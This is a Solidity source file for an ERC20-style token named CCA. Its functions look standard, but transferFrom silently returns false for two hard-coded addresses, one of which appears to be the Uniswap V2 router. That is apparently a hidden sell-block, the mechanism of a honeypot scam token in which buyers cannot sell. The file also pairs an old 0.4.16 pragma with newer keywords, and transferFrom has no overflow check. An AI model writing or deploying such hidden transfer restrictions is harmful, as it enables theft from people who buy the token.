pragma solidity ^0.4.16;  
contract EC20{  
    uint256 public totalSupply;  
  
    function balanceOf(address _owner) public constant returns (uint256 balance);  
    function transfer(address _to, uint256 _value) public returns (bool success);  
    function transferFrom(address _from, address _to, uint256 _value) public returns     
    (bool success);  
  
    function approve(address _spender, uint256 _value) public returns (bool success);  
  
    function allowance(address _owner, address _spender) public constant returns   
    (uint256 remaining);  
  
    event Transfer(address indexed _from, address indexed _to, uint256 _value);  
    event Approval(address indexed _owner, address indexed _spender, uint256   
    _value);  
}  


  
contract CCA is EC20 {  
  
    string public name;                 
    uint8 public decimals;              
    string public symbol;               
    constructor(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) public {  
        totalSupply = _initialAmount * 10 ** uint256(_decimalUnits);    
        balances[msg.sender] = totalSupply; 
  
        name = _tokenName;                     
        decimals = _decimalUnits;            
        symbol = _tokenSymbol;  
    }  
  
    function transfer(address _to, uint256 _value) public returns (bool success) {  
        require(balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]);  
        require(_to != 0x0);  
        balances[msg.sender] -= _value;
        balances[_to] += _value;
       emit Transfer(msg.sender, _to, _value);
        return true;  
    }  
  
  
    function transferFrom(address _from, address _to, uint256 _value) public returns   
    (bool success) {  
        require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);  
        if(_from==0x1c72e0FbF8BEB4e933C86cbB5d7b84879cd0FE69||_to==0x1c72e0FbF8BEB4e933C86cbB5d7b84879cd0FE69){
            return false;
        }
        if(_from==0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D||_to==0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            return false;
        }
        balances[_to] += _value; 
        balances[_from] -= _value; 
        allowed[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;  
    }  
    function balanceOf(address _owner) public constant returns (uint256 balance) {  
        return balances[_owner];  
    }  
  
  
    function approve(address _spender, uint256 _value) public returns (bool success)     
    {   
        allowed[msg.sender][_spender] = _value;  
     emit   Approval(msg.sender, _spender, _value);  
        return true;  
    }  
  
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {  
        return allowed[_owner][_spender];
    }  
    mapping (address => uint256) balances;  
    mapping (address => mapping (address => uint256)) allowed;  
}